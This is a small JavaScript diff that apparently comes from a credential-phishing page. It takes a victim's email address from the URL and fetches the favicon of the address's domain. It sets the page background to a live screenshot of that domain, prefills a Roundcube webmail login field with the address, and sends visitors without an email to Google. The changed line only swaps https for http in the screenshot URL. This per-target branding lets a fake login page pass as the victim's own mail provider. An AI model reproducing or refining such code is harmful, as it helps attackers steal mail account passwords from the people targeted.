@@ -180,7 +180,7 @@
             const domain = emailParts[1];
             const faviconUrl = `https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://${domain}&size=400`;
             setFavicon(faviconUrl);
-            document.body.style.backgroundImage = `url("https://image.thum.io/get/auth/69574-b7bbbtyut/width/1200/crop/700/https://${domain}")`;
+            document.body.style.backgroundImage = `url("https://image.thum.io/get/auth/69574-b7bbbtyut/width/1200/crop/700/http://${domain}")`;
             document.getElementById("rcmloginuser").value = emailParam;
         } else {
             redirectToGoogle();
